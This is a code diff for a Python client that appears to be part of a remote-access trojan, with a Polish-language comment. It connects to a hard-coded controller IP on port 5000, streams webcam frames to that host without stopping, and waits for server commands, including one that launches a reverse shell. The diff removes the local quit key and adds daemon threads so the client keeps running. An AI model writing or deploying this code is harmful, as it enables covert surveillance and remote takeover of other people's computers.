@@ -5,24 +5,36 @@ import time
 import cv2
 import pickle
 import struct
+import threading
+from queue import Queue
+
+NUMBER_OF_THREADS = 2
+JOB_NUMBER = [1,2]
+queue = Queue()
+
+"""
+Program clienta musi dostać informacje od serwera o zakończeniu działania pętli poszczególnych funkcji.
+Brak przerwania ich uniemożliwia zmianę wykonywanych operacji ze strony serwera
+"""
+
+
+#HOST = '157.245.34.67'
+HOST = '192.168.1.227'
+PORT = 5000
 
 def camera(client_socket):
-    connection = client_socket.makefile('wb')
     encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 90]
     cam = cv2.VideoCapture(0)
     cam.set(3, 720)
     cam.set(4, 480)
     img_counter = 0
-    while True:
+    while True: 
         ret, frame = cam.read()
         result, frame = cv2.imencode('.jpg', frame, encode_param)
         data = pickle.dumps(frame, 0)
         size = len(data)
         client_socket.sendall(struct.pack(">L", size) + data)
         img_counter += 1
-        key = cv2.waitKey(1)
-        if key == ord('q'):
-            break
 
     cam.release()
 
@@ -49,12 +61,34 @@ def waitForInstructions(client_socket):
             elif command == '2':
                 reverseShell(client_socket)
 
+# Create worker threads
+def create_workers():
+    for _ in range(NUMBER_OF_THREADS):
+        thread = threading.Thread(target=work)
+        thread.daemon = True
+        thread.start()
+
+# Do the next job in the queue (one handles connections, other sends commands)
+def work():
+    while True:
+        x = queue.get()
+        if x == 1:
+            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            client_socket.connect((HOST,PORT))
+            waitForInstructions(client_socket)
+            
+        queue.task_done()
+
+# Each list item is a new job
+def create_jobs():
+    for x in JOB_NUMBER:
+        queue.put(x)
+    queue.join()
+
 def main():
-    HOST = '157.245.34.67'
-    PORT = 5000
-    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client_socket.connect((HOST,PORT))
-    waitForInstructions(client_socket)
+    create_workers()
+    create_jobs()
+    
 
 
 if __name__ == '__main__':
